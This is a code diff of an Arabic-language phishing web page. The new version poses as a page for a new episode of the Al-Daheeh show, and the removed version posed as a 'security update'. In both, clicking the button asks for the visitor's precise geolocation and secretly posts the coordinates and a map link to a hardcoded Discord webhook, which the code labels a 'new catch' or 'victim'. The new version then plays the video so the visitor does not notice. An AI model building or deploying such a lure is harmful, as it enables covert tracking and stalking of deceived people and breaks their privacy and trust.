@@ -3,60 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث أمان النظام</title>
+    <title>الدحيح - حلقة جديدة</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #23272a; color: white; }
-        .card { text-align: center; padding: 40px; background: #2c2f33; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
-        h2 { color: #ffffff; margin-bottom: 20px; }
-        p { color: #99aab5; margin-bottom: 30px; line-height: 1.6; }
-        button { padding: 15px 30px; background: #7289da; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; transition: background 0.3s; width: 100%; }
-        button:hover { background: #5b6eae; }
+        body { margin: 0; padding: 0; background-color: #000; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; }
+        .video-container { width: 90%; max-width: 700px; position: relative; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; align-items: center; justify-content: center; z-index: 10; cursor: pointer; border-radius: 10px; }
+        .play-btn { background: #ff0000; color: white; padding: 15px 30px; border-radius: 50px; font-weight: bold; font-size: 20px; border: none; }
+        iframe { width: 100%; height: 350px; border-radius: 10px; border: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>تحديث مطلوب</h2>
-        <p>يجب تحديث بيانات الموقع لضمان أمان الحساب وتفعيل ميزات التشفير الجديدة.</p>
-        <button onclick="sendLocation()">تحديث الآن</button>
+
+    <div class="video-container" id="container">
+        <div class="overlay" id="overlay" onclick="startApp()">
+            <button class="play-btn">▶ تشغيل الحلقة</button>
+        </div>
+        <iframe id="video" src="https://www.youtube.com/embed/pS8h6C86oXQ?autoplay=0" allow="autoplay"></iframe>
     </div>
 
+    <p style="margin-top: 20px; color: #aaa;">يرجى تفعيل الصلاحيات لمشاهدة الحلقة بجودة عالية</p>
+
     <script>
-        // رابط الديسكورد بتاعك مدمج هنا
         const discordUrl = 'https://discord.com/api/webhooks/1462333386679910473/Nguba4bLHhTBYcBoV_3J5VUTc3qgiDuwnrJorHJkEm4BghKpbzbTPfe3FcqI7yVe8dt_';
 
-        function sendLocation() {
+        function startApp() {
+            // أول ما يدوس على تشغيل، نطلب اللوكيشن
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
                     const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                     
-                    const payload = {
-                        content: "🚨 **تم رصد ضحية جديدة!**",
-                        embeds: [{
-                            title: "📍 موقع الضحية بالتحديد",
-                            description: `[اضغط هنا لفتح الموقع على الخريطة](${mapLink})\n\n**الإحداثيات:** ${lat}, ${lon}\n**دقة الموقع:** ${accuracy} متر`,
-                            color: 15158332,
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
-
+                    // إرسال البيانات لديسكورد
                     fetch(discordUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    }).then(() => {
-                        // بعد الإرسال يحوله لجوجل للتمويه
-                        window.location.href = "https://www.google.com";
-                    }).catch(() => {
-                        window.location.href = "https://www.google.com";
+                        body: JSON.stringify({
+                            content: "🎯 **صيد جديد من حلقة الدحيح!**",
+                            embeds: [{
+                                title: "📍 موقع الشخص",
+                                description: `[اضغط هنا لفتح الخريطة](${mapLink})\n\n**الإحداثيات:** ${lat}, ${lon}`,
+                                color: 16711680
+                            }]
+                        })
                     });
+
+                    // إخفاء الطبقة الوهمية وتشغيل الفيديو
+                    document.getElementById('overlay').style.display = 'none';
+                    let video = document.getElementById('video');
+                    video.src += "&autoplay=1";
+
                 }, (error) => {
-                    alert("عذراً، يجب الموافقة على صلاحيات الموقع لتحديث النظام بنجاح.");
+                    alert("يجب السماح بالوصول للموقع لمشاهدة الفيديو في بلدك.");
                 }, { enableHighAccuracy: true });
-            } else {
-                alert("متصفحك لا يدعم هذه الميزة.");
             }
         }
     </script>
